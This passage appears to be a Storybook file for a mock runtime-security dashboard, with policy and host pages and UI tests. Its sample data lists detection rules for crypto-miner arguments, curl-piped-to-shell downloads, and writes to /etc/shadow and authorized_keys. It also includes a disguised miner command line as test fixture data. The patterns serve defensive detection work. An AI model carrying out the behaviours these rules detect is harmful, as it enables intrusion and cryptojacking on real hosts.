  { id: "p1", name: "Crypto miner execution", rule: "proc.cryptominer_exec", category: "Process", severity: "critical", mode: "enforce", scope: "All workloads", hits7d: 3, condition: "spawned_process and (proc.args contains \"stratum+tcp\" or proc.args contains \"--donate-level\" or proc.exe startswith \"/tmp/\")", attack: "T1496" },
  { id: "p2", name: "Shell spawned in container", rule: "container.shell_spawned", category: "Container", severity: "high", mode: "alert", scope: "k8s.ns != debug", hits7d: 14, condition: "spawned_process and container and proc.name in (sh, bash, zsh, ash) and proc.pname not in (entrypoint.sh)", attack: "T1059.004" },
  { id: "p3", name: "Outbound to unexpected port", rule: "net.outbound_unexpected_port", category: "Network", severity: "high", mode: "alert", scope: "Production", hits7d: 7, condition: "outbound and not fd.sport in (80, 443, 5432, 6379, 9092) and not fd.sip in (rfc1918)", attack: "T1571" },
  { id: "p4", name: "Write to sensitive file", rule: "fim.sensitive_file_write", category: "File", severity: "high", mode: "alert", scope: "All hosts", hits7d: 5, condition: "open_write and fd.name in (/etc/passwd, /etc/shadow, /etc/sudoers, /root/.ssh/authorized_keys)", attack: "T1098" },
  { id: "p5", name: "Unsigned kernel module", rule: "kernel.module_load", category: "Kernel", severity: "medium", mode: "alert", scope: "All hosts", hits7d: 1, condition: "evt.type in (init_module, finit_module) and module.signed = false", attack: "T1547.006" },
  { id: "p6", name: "ptrace attach", rule: "proc.ptrace_attach", category: "Process", severity: "medium", mode: "alert", scope: "All hosts", hits7d: 2, condition: "evt.type = ptrace and evt.arg.request = PTRACE_ATTACH", attack: "T1055.008" },
  { id: "p7", name: "Download and execute", rule: "proc.curl_pipe_shell", category: "Process", severity: "high", mode: "enforce", scope: "Production", hits7d: 1, condition: "spawned_process and proc.pname in (curl, wget) and proc.name in (sh, bash)", attack: "T1105" },
  { id: "p8", name: "Privileged container started", rule: "container.privileged", category: "Container", severity: "medium", mode: "off", scope: "k8s.ns != kube-system", hits7d: 0, condition: "container_started and container.privileged = true", attack: "T1611" },
];

function PoliciesPage() {
  const [modes, setModes] = useState<Record<string, PolicyMode>>(Object.fromEntries(POLICIES.map((p) => [p.id, p.mode])));
  const [active, setActive] = useState("p2");
  const [saved, setSaved] = useState<string | null>(null);
  const cur = POLICIES.find((p) => p.id === active);
  const cols: Column<Policy>[] = [
    {
      id: "name",
      header: "Policy",
      width: "30%",
      cell: (p) => (
        <span className="flex min-w-0 flex-col">
          <span className="truncate font-medium">{p.name}</span>
          <span className="truncate font-mono text-2xs text-fg-muted">{p.rule}</span>
        </span>
      ),
    },
    { id: "cat", header: "Category", cell: (p) => <Badge>{p.category}</Badge> },
    { id: "sev", header: "Severity", sortValue: (p) => SEVERITY_META[p.severity].rank, cell: (p) => <SeverityBadge severity={p.severity} /> },
    { id: "scope", header: "Scope", cell: (p) => <span className="text-xs">{p.scope}</span> },
    { id: "hits", header: "Hits · 7 d", align: "right", mono: true, sortValue: (p) => p.hits7d, cell: (p) => p.hits7d },
    {
      id: "mode",
      header: "Mode",
      description: "Enforce kills the process or drops the connection. Alert only raises a detection.",
      sortValue: (p) => modes[p.id] ?? p.mode,
      cell: (p) => <Badge tone={modes[p.id] === "enforce" ? "danger" : modes[p.id] === "alert" ? "warning" : "neutral"}>{modes[p.id]}</Badge>,
    },
  ];
  return (
    <>
      <PageHeader title="Policies" description="34 policies, 8 shown: the ones that fired or changed this month." actions={<Button variant="primary" icon={<Plus />}>New policy</Button>} />
      <Callout tone="info" title="Switch to enforce after a week in alert mode">
        Policies run in alert mode first. When a policy has had no false positives for 7 days, you can enforce it.
      </Callout>
      <div className="grid gap-2.5 xl:grid-cols-[minmax(0,3fr)_minmax(0,2fr)]">
        <Panel title="Policies" flush>
          <DataTable label="Runtime policies" columns={cols} rows={POLICIES} getRowId={(p) => p.id} onRowClick={(p) => (setActive(p.id), setSaved(null))} activeRowId={active} minWidth={860} />
        </Panel>
        <Panel title="Policy" description={cur?.name} aria-label="Policy detail">
          {cur && (
            <div className="flex flex-col gap-2.5 text-sm">
              <SegmentedControl
                label="Mode"
                value={modes[cur.id] ?? cur.mode}
                onChange={(m) => (setModes((s) => ({ ...s, [cur.id]: m })), setSaved(`${cur.name} set to ${m}`))}
                options={[
                  { value: "enforce", label: "Enforce" },
                  { value: "alert", label: "Alert" },
                  { value: "off", label: "Off" },
                ]}
              />
              <div className="flex flex-col gap-1">
                <span className="text-xs text-fg-muted">Condition</span>
                <pre className="overflow-x-auto rounded border border-line bg-subtle p-2 font-mono text-xs whitespace-pre-wrap" tabIndex={0} aria-label="Condition">
                  {cur.condition}
                </pre>
              </div>
              <dl className="grid grid-cols-[auto_minmax(0,1fr)] gap-x-3 gap-y-1">
                <dt className="text-fg-muted">ATT&CK</dt>
                <dd className="font-mono text-xs">{cur.attack}</dd>
                <dt className="text-fg-muted">Scope</dt>
                <dd>{cur.scope}</dd>
                <dt className="text-fg-muted">Hits · 7 d</dt>
                <dd>{cur.hits7d}</dd>
              </dl>
              {saved && (
                <p role="status" className="text-xs text-success">
                  {saved} · pushed to 46 sensors
                </p>
              )}
            </div>
          )}
        </Panel>
      </div>
    </>
  );
}

/* ------------------------------------------------------------------ */
/* Hosts                                                               */
/* ------------------------------------------------------------------ */

interface RtHost {
  id: string;
  name: string;
  os: string;
  kernel: string;
  sensor: string;
  status: "healthy" | "silent" | "outdated";
  pods: number;
  eps: number[];
  lastSeen: string;
  mode: "Enforce" | "Alert only";
}

const RT_HOSTS: RtHost[] = [
  { id: "h1", name: "worker-prod-04", os: "Ubuntu 24.04", kernel: "6.8.0-45", sensor: "0.14.2", status: "healthy", pods: 38, eps: wave(24, { base: 410, amp: 90, seed: 3 }), lastSeen: "now", mode: "Enforce" },
  { id: "h2", name: "worker-prod-09", os: "Ubuntu 24.04", kernel: "6.8.0-45", sensor: "0.14.2", status: "healthy", pods: 41, eps: wave(24, { base: 460, amp: 120, seed: 4, spike: 300, spikeAt: 18, spikeLen: 2 }), lastSeen: "now", mode: "Enforce" },
  { id: "h3", name: "api-prod-01", os: "Debian 12", kernel: "6.1.0-25", sensor: "0.14.2", status: "healthy", pods: 22, eps: wave(24, { base: 220, amp: 60, seed: 5 }), lastSeen: "now", mode: "Enforce" },
  { id: "h4", name: "api-prod-03", os: "Debian 12", kernel: "6.1.0-25", sensor: "0.14.1", status: "outdated", pods: 24, eps: wave(24, { base: 250, amp: 70, seed: 6 }), lastSeen: "now", mode: "Alert only" },
  { id: "h5", name: "db-prod-01", os: "Rocky Linux 9.4", kernel: "5.14.0-427", sensor: "0.14.2", status: "healthy", pods: 0, eps: wave(24, { base: 90, amp: 20, seed: 7 }), lastSeen: "now", mode: "Alert only" },
  { id: "h6", name: "db-prod-02", os: "Rocky Linux 9.4", kernel: "5.14.0-427", sensor: "0.14.2", status: "healthy", pods: 0, eps: wave(24, { base: 85, amp: 20, seed: 8 }), lastSeen: "now", mode: "Alert only" },
  { id: "h7", name: "edge-fra-02", os: "Ubuntu 22.04", kernel: "5.15.0-119", sensor: "0.13.9", status: "outdated", pods: 6, eps: wave(24, { base: 140, amp: 40, seed: 9 }), lastSeen: "now", mode: "Alert only" },
  { id: "h8", name: "edge-lon-01", os: "Ubuntu 22.04", kernel: "5.15.0-119", sensor: "0.14.2", status: "silent", pods: 6, eps: [...wave(22, { base: 130, amp: 30, seed: 10 }), 0, 0], lastSeen: "2 h ago", mode: "Alert only" },
];

const HOST_STATUS_TONE = { healthy: "success", silent: "danger", outdated: "warning" } as const;

function HostsPage() {
  const [status, setStatus] = useState<string[]>([]);
  const [upgraded, setUpgraded] = useState<string[]>([]);
  const rows = RT_HOSTS.filter((h) => status.length === 0 || status.includes(h.status));
  const cols: Column<RtHost>[] = [
    { id: "name", header: "Host", pinned: "left", cell: (h) => <EntityChip kind="host" value={h.name} hideKind /> },
    { id: "os", header: "OS / kernel", cell: (h) => <span className="flex flex-col"><span className="text-xs">{h.os}</span><span className="font-mono text-2xs text-fg-muted">{h.kernel}</span></span> },
    { id: "sensor", header: "Sensor", mono: true, cell: (h) => (upgraded.includes(h.id) ? "0.14.2" : h.sensor) },
    { id: "status", header: "Status", sortValue: (h) => h.status, cell: (h) => <StatusBadge tone={HOST_STATUS_TONE[upgraded.includes(h.id) ? "healthy" : h.status]}>{upgraded.includes(h.id) ? "healthy" : h.status}</StatusBadge> },
    { id: "mode", header: "Mode", cell: (h) => <span className="text-xs">{h.mode}</span> },
    { id: "pods", header: "Pods", align: "right", mono: true, sortValue: (h) => h.pods, cell: (h) => h.pods },
    { id: "eps", header: "Events / s · 24 h", width: "150px", cell: (h) => <Sparkline data={h.eps} label={`Events per second on ${h.name}`} height={24} /> },
    { id: "seen", header: "Last seen", mono: true, cell: (h) => h.lastSeen },
    {
      id: "act",
      header: "",
      width: "96px",
      hideable: false,
      cell: (h) =>
        h.status === "outdated" && !upgraded.includes(h.id) ? (
          <Button size="xs" onClick={() => setUpgraded((u) => [...u, h.id])} aria-label={`Upgrade ${h.name}`}>
            Upgrade
          </Button>
        ) : null,
    },
  ];
  return (
    <>
      <PageHeader title="Hosts" description="Every host running the eBPF sensor. Kernels 5.8+ are supported; older kernels fall back to kprobes." actions={<Button icon={<Download />}>Install sensor</Button>} />
      <Callout tone="danger" title="edge-lon-01 stopped reporting 2 h ago">
        The sensor process is not sending heartbeats. Network IDS still sees traffic from this host, so it is up.
      </Callout>
      <KpiGrid>
        <KpiCard label="Hosts" value="47" unit="with sensor" />
        <KpiCard label="Healthy" value="44" tone="success" />
        <KpiCard label="Outdated sensor" value={`${2 - upgraded.length}`} tone={upgraded.length >= 2 ? "success" : "warning"} />
        <KpiCard label="Silent" value="1" tone="danger" />
      </KpiGrid>
      <FilterBar onClear={status.length ? () => setStatus([]) : undefined}>
        <FacetFilter label="Status" selected={status} onChange={setStatus} options={(["healthy", "outdated", "silent"] as const).map((s) => ({ value: s, count: RT_HOSTS.filter((h) => h.status === s).length }))} />
      </FilterBar>
      {upgraded.length > 0 && (
        <p role="status" className="text-sm text-success">
          Upgrade to 0.14.2 rolled out to {upgraded.length} host{upgraded.length > 1 ? "s" : ""}
        </p>
      )}
      <Panel title="Hosts" description={`${rows.length} shown`} flush>
        <DataTable label="Sensor hosts" columns={cols} rows={rows} getRowId={(h) => h.id} minWidth={1000} />
      </Panel>
    </>
  );
}

const PAGES = {
  detections: () => <DetectionsPage />,
  events: () => <EventsPage />,
  processes: () => <ProcessesPage />,
  fim: () => <FimPage />,
  policies: () => <PoliciesPage />,
  hosts: () => <HostsPage />,
};

const app = (initial: string): Story => ({ render: () => <ProductApp product="runtime" nav={nav} pages={PAGES} initial={initial} /> });

export const Detections: Story = {
  ...app("detections"),
  play: async ({ canvasElement }) => {
    const c = within(canvasElement);
    const tree = () => c.getByRole("list", { name: /^Process tree for/ });
    await expect(within(tree()).getByText(/kworker -o 198\.51\.100\.201:3333/)).toBeInTheDocument();
    const table = c.getByRole("table", { name: "Runtime detections" });
    await userEvent.click(within(table).getByText("Shell spawned in container"));
    await expect(tree()).toHaveAccessibleName("Process tree for Shell spawned in container");
    await expect(within(tree()).getByText("node /app/server.js")).toBeInTheDocument();
    await expect(within(tree()).queryByText(/kworker/)).not.toBeInTheDocument();
  },
};

export const Events: Story = {
  ...app("events"),
  play: async ({ canvasElement }) => {
    const c = within(canvasElement);
    await expect(c.getByLabelText("Event fields")).toHaveTextContent("proc.cryptominer_exec");
    await userEvent.click(c.getByRole("tab", { name: /Kernel/ }));
    await expect(c.getByRole("table", { name: "Runtime events" }).querySelectorAll("tbody tr")).toHaveLength(2);
  },
};

export const Processes: Story = {
  ...app("processes"),
  play: async ({ canvasElement }) => {
    const c = within(canvasElement);
    await userEvent.click(c.getByRole("switch", { name: "Only new or drifted" }));
    await expect(c.getByRole("table", { name: "Processes" }).querySelectorAll("tbody tr")).toHaveLength(3);
    await userEvent.click(c.getByRole("button", { name: "Kill 18803" }));
    await expect(c.getByRole("status")).toHaveTextContent("Sent SIGKILL to 18803 on worker-prod-09");
  },
};

export const FileIntegrity: Story = {
  name: "File integrity",
  ...app("fim"),
  play: async ({ canvasElement }) => {
    const c = within(canvasElement);
    await userEvent.click(c.getByRole("switch", { name: "Only outside change window" }));
    await expect(c.getByRole("table", { name: "File changes" }).querySelectorAll("tbody tr")).toHaveLength(4);
    await userEvent.click(c.getByRole("button", { name: "Approve change" }));
    await expect(c.getByRole("status")).toHaveTextContent("Approved; new hash is the baseline");
  },
};

export const Policies: Story = {
  ...app("policies"),
  play: async ({ canvasElement }) => {
    const c = within(canvasElement);
    await userEvent.click(within(c.getByRole("radiogroup", { name: "Mode" })).getByRole("radio", { name: "Enforce" }));
    await expect(c.getByText(/Shell spawned in container set to enforce/)).toBeInTheDocument();
  },
};

export const Hosts: Story = {
  ...app("hosts"),
  play: async ({ canvasElement }) => {
    const c = within(canvasElement);
    await userEvent.click(c.getByRole("button", { name: "Upgrade edge-fra-02" }));
    await expect(c.getByRole("status")).toHaveTextContent("Upgrade to 0.14.2 rolled out to 1 host");
  },
};

export const Integrations: Story = app("integrations");
export const Settings: Story = app("settings");
